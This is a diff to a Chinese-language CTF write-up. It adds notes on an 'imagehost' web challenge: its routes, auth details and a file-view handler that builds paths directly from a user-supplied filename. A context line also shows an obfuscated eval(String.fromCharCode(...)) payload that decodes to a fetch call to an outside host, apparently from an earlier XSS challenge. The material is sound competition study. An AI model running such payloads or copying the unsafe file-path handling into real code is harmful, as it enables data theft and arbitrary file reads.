@@ -23,7 +23,27 @@ eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,1
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240413232240.png)
 
 ### imagehost
+flag在上传的png里
+`FLAG_FILENAME="$(python3 -c 'import uuid;print(uuid.uuid4())').png"`
 
+Route("/", home),   主页,jwt鉴权,给出当前用户所有上传的照片
+Route("/login", login_get), 返回login.html,jinjia2渲染无ssti
+Route("/login", login, methods=["POST"]),    传入用户名/密码,fetchone,设置jwt里userid和admin
+Route("/register", register_get),             register.html
+Route("/register", register, methods=["POST"]),   insert,参数化
+Route("/logout", logout),                  
+Route("/", upload, methods=["POST"]),        上传文件,
+Route("/view/{filename}", view),   
+```python
+async def view(request):
+	filename = request.path_params["filename"]
+	
+	path = UPLOAD_FOLDER.joinpath("a").with_name(filename)
+	if not path.exists():
+		return PlainTextResponse("Image not found", 404)
+	
+	return FileResponse(UPLOAD_FOLDER.joinpath("a").with_name(filename))
+```
 
 
 # reverse
